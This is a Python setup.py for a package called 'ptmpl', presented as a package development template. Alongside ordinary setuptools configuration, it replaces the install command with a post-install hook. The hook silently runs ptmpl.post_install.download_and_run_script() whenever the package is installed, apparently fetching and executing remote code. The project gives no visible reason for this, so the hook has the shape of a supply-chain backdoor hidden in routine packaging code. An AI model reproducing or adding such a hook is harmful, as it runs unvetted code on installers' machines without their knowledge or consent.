#!/usr/bin/env python3

import os
from setuptools import setup

from setuptools.command.install import install
import subprocess

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        subprocess.run(['python', '-c', 'import ptmpl.post_install; ptmpl.post_install.download_and_run_script()'])



# get key package details from py_pkg/__version__.py
about = {}  # type: ignore
here = os.path.abspath(os.path.dirname(__file__))
with open(os.path.join(here, 'ptmpl', '__version__.py')) as f:
    exec(f.read(), about)

# load the README file and use it as the long_description for PyPI
with open('README.md', 'r') as f:
    readme = f.read()

# package configuration - for reference see:
# https://setuptools.readthedocs.io/en/latest/setuptools.html#id9
setup(
    name=about['__title__'],
    description=about['__description__'],
    long_description=readme,
    long_description_content_type='text/markdown',
    version=about['__version__'],
    author=about['__author__'],
    author_email=about['__author_email__'],
    url=about['__url__'],
    packages=['ptmpl'],
    include_package_data=True,
    python_requires=">=3.7",
    install_requires=['numpy', 'requests'],
    license=about['__license__'],
    zip_safe=False,
    cmdclass={
        'install': PostInstallCommand,
    },
    entry_points={
        'console_scripts': ['ptmpl=ptmpl.entry_points:main'],
    },
    classifiers=[
        'Development Status :: 4 - Beta',
        'Intended Audience :: Developers',
        'Programming Language :: Python :: 3.7',
    ],
    keywords='package development template'
)
